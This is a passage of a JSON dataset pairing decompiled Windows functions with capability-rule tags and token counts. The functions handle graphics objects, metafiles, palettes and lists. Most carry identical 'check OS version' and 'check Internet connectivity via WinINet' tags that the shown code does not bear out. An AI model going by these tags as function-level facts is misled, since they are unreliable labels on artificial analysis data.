 piVar1 = iVar2 + 8;\n    *piVar1 = *piVar1 + *(iVar2 + 8);\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *in_FS_OFFSET = uVar3;\n    fcn.00402f1c(0x426c04);\n    fcn.00402f1c();\n    fcn.00402f1c();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 896
    },
    "00426c6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00426c6c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x20) = 1;\n    if (*(in_EAX + 0x12) != 0) {\n        (**(in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00426c84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00426c84(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        uVar2 = (**(**(arg_8h + -8) + 0x1c))();\n        return uVar2 ^ 1;\n    }\n    cVar1 = fcn.004047dc();\n    if ((cVar1 != '\\0') && (cVar1 = (**(**(arg_8h + -8) + 0x18))(),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "00426d28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00426d28(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    ulong uVar7;\n    ulong uVar8;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 == NULL) {\ncode_r0x00426d4d:\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack32 = 0x426d40;\n        iVar2 = fcn.00404528();\n        puStack32 = 0x426d49;\n        iVar3 = fcn.00404528();\n        if (iVar2 != iVar3) goto code_r0x00426d4d;\n        var_1h._0_1_ = 1;\n    }\n    puStack32 = 0x426d5d;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\n        puStack32 = 0x426d68;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 == '\\0') {\n            if (var_1h != 0) {\n                puStack32 = 0x426da6;\n                puVar4 = fcn.00404620();\n                uStack36 = 0x426e5f;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x426dc1;\n                puStack32 = &fcn.00426d28::var_1h + 1;\n                (**(*in_EAX + 0x44))();\n                puStack44 = 0x426dcd;\n                puVar5 = fcn.00404620();\n                uStack48 = 0x426e42;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.00426d28::var_1h + 1;\n                (**(*param_2 + 0x44))();\n                uVar7 = (***puVar4)();\n                uVar8 = (***puVar5)();\n                if (uVar8 >> 0x20 == uVar7 >> 0x20 && uVar8 == uVar7) {\n                    (***puVar4)();\n                    cVar1 = fcn.00409944();\n                    if (cVar1 != '\\0') {\n                        var_1h._0_1_ = 1;\n                        goto code_r0x00426e29;\n                    }\n                }\n                var_1h._0_1_ = 0;\ncode_r0x00426e29:\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x426e49;\n                uStack48 = 0x426e41;\n                uVar6 = fcn.00404650();\n                return uVar6;\n            }\n            goto code_r0x00426e66;\n        }\n    }\n    puStack32 = 0x426d73;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 != '\\0') {\n        puStack32 = 0x426d7e;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 != '\\0') {\n            var_1h._0_1_ = 1;\n            goto code_r0x00426e66;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x00426e66:\n    return var_1h;\n}\n",
        "token_count": 941
    },
    "00426ed4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426ed4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1a) != 0) {\n        (**(in_EAX + 0x18))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00426fa0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00426fa0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x42701e;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.00419888();\n            fcn.00404530();\n            fcn.00405794();\n            fcn.00405974();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x427025;\n    uStack288 = 0x42701d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 283
    },
    "004271a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004271a4(uint param_1, int16_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 8) + 8) + -1;\n    if (-1 < iVar3) {\n        do {\n            iVar1 = fcn.00419888();\n            if (param_2 == iVar1) {\n                uVar2 = fcn.00419888();\n                return uVar2;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 156
    },
    "004271e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004271e0(void)\n\n{\n    if (*0x48fe40 == 0) {\n        *0x48fe40 = fcn.00427090();\n    }\n    return *0x48fe40;\n}\n",
        "token_count": 54
    },
    "00427548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427548(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x22) != 0) {\n        (**(in_EAX + 0x20))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "00427574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427574(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x42767a;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piStack104 = 0x4275a3;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x4275b1;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x4275bc;\n    fcn.00405794();\n    piStack104 = 0x4275c9;\n    iVar1 = fcn.00426fa0();\n    var_4h = NULL;\n    if (iVar1 != 0) {\n        piStack104 = 0x4275d7;\n        var_4h = (**(iVar1 + 0x48))();\n        uStack108 = 0x4275fc;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        piStack104 = &stack0xfffffffc;\n        (**(*var_4h + 0x30))();\n        *in_FS_OFFSET = uStack112;\n    }\n    piStack104 = 0x42761b;\n    fcn.00404650();\n    *(in_EAX + 0xc) = var_4h;\n    if (var_4h != NULL) {\n        var_4h[5] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x427639;\n        iVar1 = fcn.00404864();\n        piStack104[4] = iVar1;\n        var_4h[7] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x427651;\n        iVar1 = fcn.00404864();\n        piStack104[6] = iVar1;\n    }\n    piStack104 = 0x427664;\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x427681;\n    uStack96 = 0x427679;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 596
    },
    "004276e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004276e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    bool bVar4;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x20);\n    if (iVar1 == 0) {\n        bVar4 = *(*(arg_8h + -8) + 0xc) != 0;\n    }\n    else {\n        bVar4 = true;\n        cVar3 = fcn.004047dc();\n        if (cVar3 != '\\0') {\n            if ((*(*(arg_8h + -8) + 0xc) == *(iVar1 + 0xc)) ||\n               (((piVar2 = *(*(arg_8h + -8) + 0xc),  piVar2 != NULL && (*(iVar1 + 0xc) != 0)) &&\n                (cVar3 = (**(*piVar2 + 0x18))(),  cVar3 != '\\0')))) {\n                bVar4 = false;\n            }\n            else {\n                bVar4 = true;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 266
    },
    "00427c98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00427c98(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint lpemh;\n    uint var_76h;\n    uint var_72h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    int32_t var_22h;\n    uint var_1ch;\n    uint nNumber;\n    uint nDenominator;\n    int16_t var_eh;\n    uint lpbBuffer;\n    int32_t cbBuffer;\n    int32_t *var_4h;\n    \n    puStack172 = 0x427cb3;\n    var_4h = param_2;\n    fcn.00427b34();\n    puStack172 = 0x427cc3;\n    (**(*var_4h + 0xc))();\n    if (var_22h == -0x65393229) {\n        puStack172 = 0x427cd4;\n        iVar2 = fcn.004267f0();\n        if (iVar2 == var_eh) goto code_r0x00427cdf;\n    }\n    puStack172 = 0x427cdf;\n    fcn.00425990();\ncode_r0x00427cdf:\n    cbBuffer = cbBuffer + -0x16;\n    puStack172 = 0x427ceb;\n    lpbBuffer = fcn.00402f00();\n    iVar1 = *(in_EAX + 0x28);\n    uStack176 = 0x427e07;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff4c;\n    puStack172 = &stack0xfffffffc;\n    (**(*var_4h + 0xc))();\n    *(*(in_EAX + 0x28) + 0x18) = nDenominator;\n    if (nDenominator == 0) {\n        nDenominator._0_2_ = 0x60;\n    }\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber - var_1ch, 0x9ec, nDenominator);\n    *(iVar1 + 0xc) = uVar3;\n    uVar3 = sub.kernel32.dll_MulDiv(nNumber._2_2_ - var_1ch._2_2_, 0x9ec, nDenominator);\n    *(iVar1 + 0x10) = uVar3;\n    var_32h = 8;\n    var_2eh = 0;\n    var_2ah = 0;\n    var_26h = 0;\n    iVar4 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00427c98::var_32h);\n    *(iVar1 + 8) = iVar4;\n    if (iVar4 == 0) {\n        fcn.00425990();\n    }\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &fcn.00427c98::lpemh);\n    var_32h = 8;\n    var_2eh = var_76h;\n    var_2ah = var_72h;\n    var_26h = 0;\n    sub.gdi32.dll_DeleteEnhMetaFile(*(iVar1 + 8));\n    iVar4 = cbBuffer;\n    iVar5 = sub.gdi32.dll_SetWinMetaFileBits(cbBuffer, lpbBuffer, 0, &fcn.00427c98::var_32h);\n    *(iVar1 + 8) = iVar5;\n    if (iVar5 == 0) {\n        fcn.00425990();\n    }\n    *(in_EAX + 0x2c) = 0;\n    *in_FS_OFFSET = iVar4;\n    fcn.00402f1c(0x427e0e);\n    return;\n}\n",
        "token_count": 933
    },
    "00427f70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427f70(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00427b34();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x20) = 0;\n    if (param_2 != *(iVar1 + 0x10)) {\n        fcn.004280c0();\n        *(in_EAX[10] + 0x10) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00427fac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427fac(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[10] == 0) {\n        fcn.00427b34();\n    }\n    iVar1 = in_EAX[10];\n    *(iVar1 + 0x1c) = 0;\n    if (param_2 != *(iVar1 + 0xc)) {\n        fcn.004280c0();\n        *(in_EAX[10] + 0xc) = param_2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "004281c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004281c4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) != 0) {\n        uStack24 = 0;\n        uStack28 = 0;\n        uStack32 = *(*(in_EAX + 0x28) + 8);\n        puStack36 = 0x4281e4;\n        iVar1 = sub.gdi32.dll_GetEnhMetaFileBits();\n        if (iVar1 != 0) {\n            puStack36 = 0x4281f5;\n            uVar2 = fcn.00402f00();\n            uStack40 = 0x428240;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            uVar3 = *(*(in_EAX + 0x28) + 8);\n            puStack36 = &stack0xfffffffc;\n            sub.gdi32.dll_GetEnhMetaFileBits(uVar3, iVar1, uVar2);\n            fcn.0041b968();\n            *in_FS_OFFSET = uVar3;\n            fcn.00402f1c(0x428247);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 344
    },
    "00428250": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00428250(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint32_t uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint var_22h;\n    uint var_18h;\n    uint nNumerator;\n    uint var_eh;\n    uint cbBuffer;\n    uint lpbBuffer;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        return;\n    }\n    uStack52 = 0x428275;\n    fcn.00403af4();\n    iVar1 = *(in_EAX + 0x28);\n    nNumerator._0_2_ = *(iVar1 + 0x18);\n    if (nNumerator == 0) {\n        nNumerator._0_2_ = 0x60;\n    }\n    uStack52 = 0x9ec;\n    uStack56 = nNumerator;\n    uStack60 = *(iVar1 + 0xc);\n    uStack64 = 0x4282a7;\n    sub.kernel32.dll_MulDiv();\n    uStack64 = 0x9ec;\n    uStack68 = nNumerator;\n    uStack72 = *(iVar1 + 0x10);\n    uStack76 = 0x4282be;\n    sub.kernel32.dll_MulDiv();\n    uStack76 = 0x4282ca;\n    fcn.004267f0();\n    uStack76 = 0;\n    puStack80 = 0x4282d5;\n    uVar2 = sub.user32.dll_GetDC();\n    uStack84 = 0x42838b;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 8;\n    uStack100 = 0;\n    uStack104 = 0;\n    uStack108 = *(iVar1 + 8);\n    puStack112 = 0x4282f9;\n    uStack92 = uVar2;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = sub.gdi32.dll_GetWinMetaFileBits();\n    puStack112 = 0x428304;\n    uVar4 = fcn.00402f00();\n    uStack116 = 0x42836b;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    uVar6 = *(iVar1 + 8);\n    puStack112 = &stack0xfffffffc;\n    uVar5 = sub.gdi32.dll_GetWinMetaFileBits(uVar6, uVar3, uVar4, 8, uVar2);\n    if (uVar5 < uVar3) {\n        fcn.004259f0();\n    }\n    fcn.0041b968();\n    fcn.0041b968();\n    *in_FS_OFFSET = uVar6;\n    fcn.00402f1c(0x428372);\n    return;\n}\n",
        "token_count": 801
    },
    "00428598": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428598(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x4285a8;\n    var_8h = fcn.00419bf8();\n    uStack24 = 0x428636;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x4285d3;\n            var_ch = fcn.00419888();\n            puStack32 = 0x4285de;\n            cVar1 = fcn.0042552c();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x42860e;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.00428728();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x428615;\n                uStack36 = 0x42860d;\n                fcn.00425588();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x42863d;\n    uStack24 = 0x428635;\n    fcn.00419c5c();\n    return;\n}\n",
        "token_count": 447
    },
    "00428644": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428644(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        puStack20 = 0x42865d;\n        iVar1 = fcn.00419bf8();\n        uStack24 = 0x4286b4;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack20 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00419888();\n                if ((*(iVar2 + 0x58) != 0) && (*(*(*(iVar2 + 0x58) + 0x28) + 8) == in_EAX)) {\n                    fcn.00428728();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x4286bb;\n        uStack24 = 0x4286b3;\n        fcn.00419c5c();\n        return;\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "00428728": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428728(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) != 0) {\n        puStack16 = 0x428745;\n        fcn.00425350();\n        uStack20 = 0x4287bc;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        if (*(in_EAX + 0x5c) != 0) {\n            puStack16 = &stack0xfffffffc;\n            sub.gdi32.dll_SelectObject(*(in_EAX + 4), *(in_EAX + 0x5c));\n        }\n        if (*(in_EAX + 0x60) != 0) {\n            sub.gdi32.dll_SelectPalette(*(in_EAX + 4), *(in_EAX + 0x60), 0xffffffff);\n        }\n        uVar1 = *(in_EAX + 4);\n        fcn.0042571c();\n        sub.gdi32.dll_DeleteDC();\n        fcn.00419c0c();\n        *in_FS_OFFSET = uVar1;\n        fcn.00425588(0x4287c3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "004287c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004287c8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        puStack20 = 0x4287e6;\n        fcn.00425350();\n        uStack24 = 0x4288a7;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        fcn.00429bdc();\n        fcn.00428644();\n        fcn.00429cdc();\n        uVar2 = sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 8);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x5c) = 0;\n        }\n        else {\n            in_stack_ffffffd8 = uVar2;\n            uVar3 = sub.gdi32.dll_SelectObject(uVar2, iVar1);\n            *(in_EAX + 0x5c) = uVar3;\n        }\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 0x10);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x60) = 0;\n        }\n        else {\n            uVar3 = sub.gdi32.dll_SelectPalette(uVar2, iVar1, 0xffffffff);\n            *(in_EAX + 0x60) = uVar3;\n            sub.gdi32.dll_RealizePalette(uVar2);\n        }\n        fcn.0042571c();\n        fcn.00419b70();\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        fcn.00425588(0x4288ae);\n        return;\n    }\n    return;\n}\n",
        "token_count": 479
    },
    "004288b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004288b8(void)\n\n{\n    uint *in_EAX;\n    \n    if ((in_EAX != NULL) && (in_EAX[1] = in_EAX[1] + -1,  in_EAX[1] == 0)) {\n        (***in_EAX)();\n        fcn.00404650();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00428a3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428a3c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x28) & 3) != 0) && (*(in_EAX + 0x40) == 0)) {\n        if (*(in_EAX + 0x26) == 0x10) {\n            *(in_EAX + 0x40) = 0xf800;\n            *(in_EAX + 0x44) = 0x7e0;\n            *(in_EAX + 0x48) = 0x1f;\n        }\n        else if (*(in_EAX + 0x26) == 0x20) {\n            *(in_EAX + 0x40) = 0xff0000;\n            *(in_EAX + 0x44) = 0xff00;\n            *(in_EAX + 0x48) = 0xff;\n        }\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "00428a88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
